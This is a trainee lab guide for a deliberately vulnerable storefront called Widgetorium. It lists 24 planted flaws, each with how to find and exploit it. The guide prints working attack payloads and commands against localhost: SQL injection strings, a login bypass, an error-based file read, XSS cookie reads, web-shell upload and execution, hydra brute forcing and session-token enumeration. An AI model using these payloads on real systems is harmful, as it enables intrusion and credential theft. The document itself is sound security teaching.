# Training scenarios: Widgetorium (trainee edition)

Each entry follows the same shape: what is broken, how ZAP finds it, and which tool
confirms or exploits it. Work out the remediation yourself, then check it
against the instructor edition. Work through them in order or jump to
whatever category you are teaching that day.

The course works every finding by hand first, a browser, `curl`, `openssl`, a
packet capture, a short script, and only then brings in a scanner to confirm it
and cover ground faster. The "ZAP finds it" line in each entry is written from
that second pass: it tells you whether the automated sweep would have caught the
bug at all. Where ZAP will not find one on its own, that is called out and is
itself a teaching point: scanners connect requests to responses, they do not
reason about stored state, object ownership, or token structure. The automation
in this lab is ZAP for discovery, sqlmap, testssl.sh, gobuster, hydra, hashcat,
and Wireshark as the per-bug spot-checks; everything else is done by hand.

## Lab facts trainees may need

- Storefront: `http://127.0.0.1:8080/`, TLS on `https://127.0.0.1:8443/`.
- FTP: `127.0.0.1:21`, anonymous, plus `ftpuser:ftpuser`.
- DNS: `127.0.0.1:5300` (TCP and UDP), authoritative for `corp.widgetorium.lab`
  and `widgetorium.lab`. Query it directly: `dig @127.0.0.1 -p 5300 ...`. Add
  the vhost names to `/etc/hosts` (pointing at `127.0.0.1`) to browse them, or
  use `curl --resolve` / `-H Host:`.
- Seed admin: `admin` / `Widgetorium2024!` (unsalted MD5 in `users.password_hash`,
  crackable). Seed customers: `alice`, `bob`, ... with rockyou-class passwords.
- `LOAD_FILE()` reads the **database container's** filesystem, not the web
  server's. The planted target is `/var/lib/mysql-files/secret.txt`.
- Passive OSINT (`theHarvester`, `amass` passive, crt.sh) finds nothing: the
  domain is not on the internet. Recon here is active, AXFR, cert inspection,
  vhost fuzzing, reading what people left lying around.
- Several bugs are stateful. Run `./reset.sh` between cohorts.
- Instructor toggles (in `.env`): `WEAK_TLS`, `SEND_HSTS`, `VERBOSE_ERRORS`,
  `SECOND_ORDER_SINK`, `WEAK_SESSIONS`, `PLANT_GIT`, `EXPIRED_CERT`, `OPEN_AXFR`.

---

## SQL injection

### 1. Product search, UNION-based
**Where:** search box, `search.php?q=`
**Vulnerability:** input concatenated into `WHERE name LIKE '%$q%'`. Three columns
are selected (`id, name, price`), so `UNION SELECT` lines up cleanly.
**ZAP finds it:** active scan flags the `q` parameter as SQL injectable.
**Confirm / exploit with:** sqlmap.
`sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch --dbs`, then
`--tables`, `-D widgetorium -T users --dump` for the credential hashes. A manual
UNION also works: `?q=x' UNION SELECT username,password_hash,role FROM users-- -`.

### 2. Login bypass
**Where:** `login.php`
**Vulnerability:** username and password concatenated into the auth query:
`WHERE username = '$u' AND password_hash = '<md5($p)>'`. Username
`' OR '1'='1' -- ` returns the first row, which is the seed admin.
**ZAP finds it:** active scan against the login endpoint may flag it; the
intended path is manual so trainees see the mechanism.
**Confirm / exploit with:** manual / curl.
`curl -i -d "username=' OR '1'='1' -- &password=x" http://127.0.0.1:8080/login.php`
then reuse the `WIDGET_SESSID` cookie.

### 3. Second-order injection via the admin inventory report
**Where:** product name, saved in `admin/products.php`, fired in
`admin/inventory_report.php`.
**Vulnerability:** the name is written through a bound parameter, so the payload
is stored verbatim and nothing happens on save. The report then concatenates
each stored name into a new query:
`SELECT COALESCE(SUM(delta),0) FROM stock_ledger WHERE label = '<name>'`.
**ZAP finds it:** no. ZAP exercises the write form and the report page
independently and never connects them. Use this as the "why you still test by
hand" moment.
**Confirm / exploit with:** manual. As admin, add a product named:
`zz' AND updatexml(1,concat(0x7e,(SELECT concat(username,0x3a,password_hash) FROM users ORDER BY id LIMIT 1)),1)-- -`
The storefront looks normal. Open the inventory report: that row's "on hand"
cell shows `XPATH syntax error: '~admin:<hash>'` (error-based, because the sink
fetches a single row, so a plain `UNION` would be hidden behind the aggregate's
first row). Walk `LIMIT 1,1`, `LIMIT 2,1` for the rest.

### 4. Price / quantity update endpoint
**Where:** `api/update_item.php` (POST `{id, price, qty}`, form or JSON).
**Vulnerability:** two bugs in one endpoint.
- **Authorisation:** any logged-in user can call it. There is no check that
  `products.owner_user_id` matches the caller and no admin-role check, so a plain
  customer edits items that are not theirs (IDOR-style).
- **Injection:** `id`, `price`, `qty` are concatenated into the `UPDATE`.
  Inject on **`id`** (it flows into `WHERE id = <id>`); `price` and `qty` land
  in numeric columns that truncate string output, so use `id` for extraction.
  Error-based file read:
  `{"id":"7 OR updatexml(1,concat(0x7e,(SELECT LEFT(LOAD_FILE(0x2f7661722f6c69622f6d7973716c2d66696c65732f7365637265742e747874),40))),1)","price":"1.00"}`
  returns the file's first bytes in the verbose SQL-error block. Works because
  the DB user holds `FILE` and `secure_file_priv` is empty. `LOAD_FILE` reads
  the **db container's** filesystem.
**ZAP finds it:** active scan flags the injection on the endpoint; the missing
authorisation needs manual parameter tampering.
**Confirm / exploit with:** curl for both halves.
`curl -b cookies.txt -d '{"id":7,"price":0.01}' -H 'Content-Type: application/json'
http://127.0.0.1:8080/api/update_item.php` as a plain customer succeeds (IDOR),
then the error-based `id` payload above. sqlmap can drive the injection with
`--data '{"id":"7*","price":"1"}'`.

---

## Certificate and TLS

### 5. Self-signed certificate, mismatched CN
**Where:** site-wide TLS, `https://127.0.0.1:8443/`.
**Vulnerability:** `CN=widget-store-prod-01`, no `subjectAltName`, no CA chain.
Nothing matches `widgetorium.local` or `localhost`.
**ZAP finds it:** passive scan flags it on first connect.
**Confirm / exploit with:** testssl.sh, or
`openssl s_client -connect 127.0.0.1:8443 -servername widgetorium.local </dev/null`
and read the `verify` line and the subject.

### 6. Expired certificate
**Where:** run with `./start.sh --expired-cert` (or `EXPIRED_CERT=1`).
**Vulnerability:** `notBefore` and `notAfter` are both in January 2019.
**ZAP finds it:** passive scan.
**Confirm / exploit with:** testssl.sh, or
`openssl s_client -connect 127.0.0.1:8443 </dev/null 2>/dev/null | openssl x509
-noout -dates`.

### 7. Weak protocol and cipher support
**Where:** site-wide TLS config (`apache/default-ssl.conf` + `openssl-weak.cnf`).
**Vulnerability:** TLS 1.0 and 1.1 offered alongside 1.2/1.3; SHA1 CBC ciphers
accepted (`AES128-SHA`, `AES256-SHA`, `DES-CBC3-SHA` where present) via
`@SECLEVEL=0`; 1024-bit DH parameters.
Note: the base image's OpenSSL is built without RC4 and EXPORT ciphers, so
those specific suites cannot be offered no matter the config. The headline
findings here are the legacy protocol versions, the SHA1/CBC ciphers, and the
weak DH size, which is exactly the profile of a real legacy deployment.
**ZAP finds it:** passive scan flags outdated protocol support.
**Confirm / exploit with:** testssl.sh `127.0.0.1:8443` (or sslyze) for the full
protocol and cipher breakdown. Quick check:
`curl -ksv --tlsv1.0 --tls-max 1.0 https://127.0.0.1:8443/health.php` succeeds.

### 8. Missing HSTS
**Where:** site-wide response headers.
**Vulnerability:** no `Strict-Transport-Security` header, so a downgrade to HTTP
is not resisted.
**ZAP finds it:** passive scan flags the missing header directly.
**Confirm / exploit with:** `curl -ksI https://127.0.0.1:8443/ | grep -i strict`
returns nothing. Pair with an HTTP-strip demo.

---

## Other web vulnerabilities

### 9. Exposed `.git` directory
**Where:** `http://127.0.0.1:8080/admin/.git/`
**Vulnerability:** a real git repo is deployed inside the web root. Its first
commit contains `WIDGETORIUM_API_KEY = 'wdg_live_sk_7f3c9a1e42b84d06b1e5c2aa9d770f18'`
in cleartext. The second commit "moves it to an environment variable", but the
key is still in history.
**ZAP finds it:** the spider may miss it, depends on wordlist coverage.
**Confirm / exploit with:** gobuster / ffuf to find the path
(`gobuster dir -u http://127.0.0.1:8080/admin/ -w <wordlist>`), then git-dumper:
`git-dumper http://127.0.0.1:8080/admin/.git/ ./loot && cd loot && git log -p |
grep -i api_key`.

### 10. IDOR on order history
**Where:** `orders.php?id=1002` (and the `order.php?id=` alias).
**Vulnerability:** order ids are sequential from 1001 and there is no check that
the order belongs to the logged-in session. Walk the ids, read every customer's
orders and line items.
**ZAP finds it:** not on its own, it looks like a normal working page.
**Confirm / exploit with:** manual.
`for i in $(seq 1001 1030); do curl -s "http://127.0.0.1:8080/orders.php?id=$i"; done`

### 11. Reflected and stored XSS in reviews
**Where:** reflected on `search.php?q=`; stored via `review.php`, rendered on
`product.php`.
**Vulnerability:** no output encoding. The search term is echoed raw; the review
body is stored raw and rendered raw for every later visitor.
**ZAP finds it:** active scan flags both.
**Confirm / exploit with:** manual.
Reflected: `http://127.0.0.1:8080/search.php?q=<script>alert(1)</script>`.
Stored: POST a review with body `<script>alert(document.cookie)</script>`, then
load the product page. The predictable session cookie (bug 13) is not
`HttpOnly`, so this reads it.

### 12. Unrestricted file upload
**Where:** `upload.php` ("list a widget for sale").
**Vulnerability:** no extension check, no content-type check, and the
client-supplied filename is used as-is, so `../` traversal works. Files land
under the web root and PHP executes there.
**ZAP finds it:** active scan may flag the endpoint, will not prove
exploitability.
**Confirm / exploit with:** manual (curl).
`curl -F 'image=@shell.php' http://127.0.0.1:8080/upload.php` then browse to
`/uploads/shell.php`. Traversal: send the multipart `filename` as
`../shell2.php` and confirm it lands a directory up.

### 13. Predictable session tokens
**Where:** `WIDGET_SESSID` cookie, minted in `lib/session.php`.
**Vulnerability:** the token is `dechex(time()) . str_pad(dechex(user_id), 4,
'0')`. Not PHP's native session id. It is validated against a `sessions` row,
so the target must have an **active** session, but given one token, or a rough
login time, an attacker enumerates a few hundred `hex(time)` values for a known
`user_id` and rides that session. `user_id` 1 is the admin, so an attacker who
knows roughly when an admin logged in takes the admin session.
**ZAP finds it:** not without the session-token analysis add-on, and even then
only weakly.
**Confirm / exploit with:** a short Python script.
Log in as two seed users a second apart, diff the cookies, spot the
`hex(time)+hex(id)` structure. With an admin session active (an instructor logs
in, or use the login bypass from bug 2), from a fresh client:
`for t in $(python3 -c "import time;[print('%x0001'%x) for x in range(int(time.time())-300,int(time.time()))]"); do
curl -s -b "WIDGET_SESSID=$t" http://127.0.0.1:8080/account.php | grep -q admin && echo "$t"; done`

### 14. Verbose error messages
**Where:** site-wide, on any query failure (`lib/db.php`).
**Vulnerability:** the failing SQL string, the driver message, and a stack trace
are rendered into the response when `VERBOSE_ERRORS=1`.
**ZAP finds it:** passive scan flags information disclosure / error content.
**Confirm / exploit with:** manual. `http://127.0.0.1:8080/search.php?q=%27`
returns the raw query and the trace, which hands you table and column names for
bugs 1 and 3.

---

## FTP server

### 15. Anonymous login with write access
**Where:** vsftpd, `127.0.0.1:21`.
**Vulnerability:** `anonymous_enable=YES` with `anon_upload_enable`,
`anon_mkdir_write_enable`, `anon_other_write_enable` all on. `anon_root=/srv/ftp`;
the writable `upload/` dir is the shared volume.
**ZAP finds it:** out of scope. Nmap and a manual FTP client take over here.
**Confirm / exploit with:** `nmap -sV -sC -p21 127.0.0.1` to fingerprint, then
`curl -T note.txt ftp://127.0.0.1/upload/note.txt` anonymously, or an
interactive `ftp`/`lftp` session.

### 16. Weak default credentials
**Where:** the `ftpuser` service account.
**Vulnerability:** `ftpuser:ftpuser`.
**ZAP finds it:** N/A.
**Confirm / exploit with:** `curl -u ftpuser:ftpuser ftp://127.0.0.1/`, or hydra
to teach credential brute-forcing:
`hydra -l ftpuser -P rockyou.txt ftp://127.0.0.1`.

### 17. Chroot escape via missing jail
**Where:** FTP file paths for local users.
**Vulnerability:** `chroot_local_user=NO`, so `ftpuser` is not confined. After
login, `cd /` exposes the whole container filesystem (`/etc/passwd`,
`/etc/vsftpd.conf`), and `cd /srv/ftp/upload` reaches the shared web directory.
**ZAP finds it:** N/A.
**Confirm / exploit with:** manual.
`lftp -u ftpuser,ftpuser 127.0.0.1 -e 'cd /etc; get passwd; bye'`.

### 18. Cleartext credentials
**Where:** the FTP control channel.
**Vulnerability:** `ssl_enable=NO`. `USER` and `PASS` cross the wire in
plaintext.
**ZAP finds it:** N/A.
**Confirm / exploit with:** `tcpdump -i lo0 -A 'tcp port 21'` (or Wireshark on
`lo0`, filter `ftp`) during a login, read `USER ftpuser` / `PASS ftpuser`.

### 19. Chained exploit: FTP upload to web shell
**Where:** the anonymous upload dir is the same volume Apache serves at
`/uploads/ftp/`.
**Vulnerability:** combines 15 (anonymous write) with the missing file-type
restriction on the web side (12). PHP executes in that directory.
**ZAP finds it:** N/A as a chain; ZAP has no view of the FTP side.
**Confirm / exploit with:**
`curl -T shell.php ftp://127.0.0.1/upload/shell.php` anonymously, then
`curl 'http://127.0.0.1:8080/uploads/ftp/shell.php?cmd=id'`.

---

## Reconnaissance

Work this category first. Passive OSINT is a dead end here on purpose:
`theHarvester`, `amass` passive mode and crt.sh all need a real internet
domain, and `corp.widgetorium.lab` is not one. That is realistic for an
internal engagement. Pivot to active: ask the nameserver, read the TLS
handshake, fuzz the `Host` header.

### 20. Open DNS zone transfer (AXFR)
**Where:** the lab nameserver, `127.0.0.1:5300`, zone `corp.widgetorium.lab`.
**Vulnerability:** the internal zone allows transfers from anyone, so one query
dumps every record: A, CNAME, the `10.10.x.x` stale hosts, SPF/DMARC/TXT, the
MX. The sibling zone `widgetorium.lab` refuses transfers; compare them.
**ZAP finds it:** no. `dig` / `dnsrecon` territory.
**Confirm / exploit with:** `dig`.
`dig axfr @127.0.0.1 -p 5300 corp.widgetorium.lab` dumps the zone.
`dig axfr @127.0.0.1 -p 5300 widgetorium.lab` returns `Transfer failed`.
`dnsrecon -n 127.0.0.1 -p 5300 -d corp.widgetorium.lab -t axfr` parses it.
Which names point at `127.0.0.1` (live), which point into `10.10.0.0/16`
(resolve, nothing answers, out of scope per `security.txt`)?

### 21. Virtual-host discovery
**Where:** the webapp on `127.0.0.1:8080` / `:8443` answers to several
hostnames, not just the storefront.
**Vulnerability:** `admin.corp.widgetorium.lab`, `dev.corp.widgetorium.lab` and
`staging.corp.widgetorium.lab` are separate name-based vhosts with their own
document roots. A request with no `Host`, a bare IP, or an unknown `Host` falls
through to the storefront, so a port scan or directory brute force never sees
them. The zone's wildcard (`*.corp.widgetorium.lab -> 127.0.0.1`) means name
resolution is no help either. Fuzz the `Host` header and diff the responses.
**ZAP finds it:** no, not without being pointed at each hostname explicitly.
**Confirm / exploit with:** `gobuster` / `ffuf` in vhost mode.
`gobuster vhost -u http://127.0.0.1:8080 --append-domain \
  --domain corp.widgetorium.lab -w <subdomains.txt>` flags `admin`, `dev`,
`staging` on response-length difference. Confirm:
`curl -s -H 'Host: dev.corp.widgetorium.lab' http://127.0.0.1:8080/`.
The AXFR (20) and the SAN list (22) hand you the candidate names.

### 22. TLS certificate leaks the internal host inventory
**Where:** the internal HTTPS vhosts, via SNI, e.g.
`openssl s_client -connect 127.0.0.1:8443 -servername admin.corp.widgetorium.lab`.
**Vulnerability:** those vhosts present one certificate whose `subjectAltName`
lists thirteen names, including `git`, `jenkins`, `vault` and `registry` that
are **not** in the DNS zone. Even with the AXFR locked, the handshake gives up
the list. The default storefront vhost still presents the bug-5 certificate
(CN mismatch, no SAN); which one you get depends on the SNI name you send.
**ZAP finds it:** passive scan records the certificate and its SANs; reading
them as a target list is your job.
**Confirm / exploit with:** `openssl` or `testssl.sh`.
`echo | openssl s_client -connect 127.0.0.1:8443 -servername admin.corp.widgetorium.lab 2>/dev/null \
  | openssl x509 -noout -ext subjectAltName`
Cross-check against the AXFR: the names not in the zone are the interesting ones.

### 23. Developer sandbox information disclosure
**Where:** `dev.corp.widgetorium.lab`, plus a backup on
`admin.corp.widgetorium.lab`.
**Vulnerability:** the dev vhost has directory listing on and leaves plenty in
the open: `phpinfo.php`, `notes/dev-notes.txt` (staff names, usernames, the
`svc-ldap-ro` account, the CI host, a note that `ftpuser/ftpuser` still works
and the API key is still literal on staging), `.well-known/security.txt` (the
in-scope host list and the out-of-scope range), `robots.txt` (points at `/s3/`
and `/notes/`). `admin.corp.widgetorium.lab` serves a listable `/backup/` with
a `users-*.sql.bak` holding the real `users` table and its unsalted MD5 hashes,
so you get the credential hashes without the SQL injection in bug 1. Staging
serves `config.php.bak` (DB creds and API key in PHP source) and
`build-info.json`.
**ZAP finds it:** a spider with directory-listing detection flags the open
directories and `phpinfo`; the value in the notes is manual reading.
**Confirm / exploit with:** browser plus `curl` / `gobuster dir`.
`curl -s -H 'Host: dev.corp.widgetorium.lab' http://127.0.0.1:8080/notes/dev-notes.txt`
`curl -s -H 'Host: admin.corp.widgetorium.lab' http://127.0.0.1:8080/backup/users-2024-11-01.sql.bak`
Feed the hashes to `hashcat -m 0` / `john`; they crack to the seed passwords.

### 24. Exposed export bucket and document metadata
**Where:** `http://dev.corp.widgetorium.lab/s3/`.
**Vulnerability:** a directory dressed up as an open object store. `/s3/`
returns an S3-style `ListBucketResult` XML. A migration-plan PDF and
`employee-directory.csv` are readable; a gzipped DB dump under `backups/` holds
`users` rows and the API key in a comment. The PDF's metadata is the lesson:
`exiftool` pulls the author name and email, a `Creator` string naming the
workstation, and `Keywords` listing an internal host and a ticket reference.
**ZAP finds it:** it will flag the directory listing / XML; the metadata and the
document contents are read by hand.
**Confirm / exploit with:** `curl` plus `exiftool`.
`curl -s -H 'Host: dev.corp.widgetorium.lab' http://127.0.0.1:8080/s3/ | xmllint --format -`
`curl -sO ... /s3/widgetorium-migration-plan.pdf && exiftool widgetorium-migration-plan.pdf`
`curl -s ... /s3/backups/db-widgetorium-2024-11-04.sql.gz | gunzip -c`
The CSV gives you a username list for `hydra` against the store login or FTP.

---

## Notes for running the lab

- Run each scenario in isolation the first time through, then chain them
  (20 into everything, 15 + 12 into 19, 14 into 1 and 3, 13 into 11) once you
  have the pieces. Recon (20-24) is meant to run first: the AXFR and the SAN
  list give up `admin`, `api` and `staging`; the dev notes and the `.sql.bak`
  give up credential hashes before bug 1 is touched; the CSV gives up a
  username list for bugs 2 and 16.
- Reset the containers between sessions with `./reset.sh`. Bugs 3, 10, 11, 12
  and 19 are stateful and will carry over otherwise. The recon surface (20-24)
  is static.
- The instructor edition adds the intended fix for each bug.
- Expected ZAP coverage: it should surface 1, 2, 4, 8, 10 (weakly), 11, 12, 14,
  and the directory listings / `phpinfo` behind 23 and 24 if pointed at the dev
  vhost. It should not surface 3, 5, 6, 7 (those are testssl.sh), 9 (gobuster),
  13, 15-19 (nmap / manual / Wireshark), or 20-22 (dig / openssl / gobuster
  vhost). That asymmetry is the lesson.
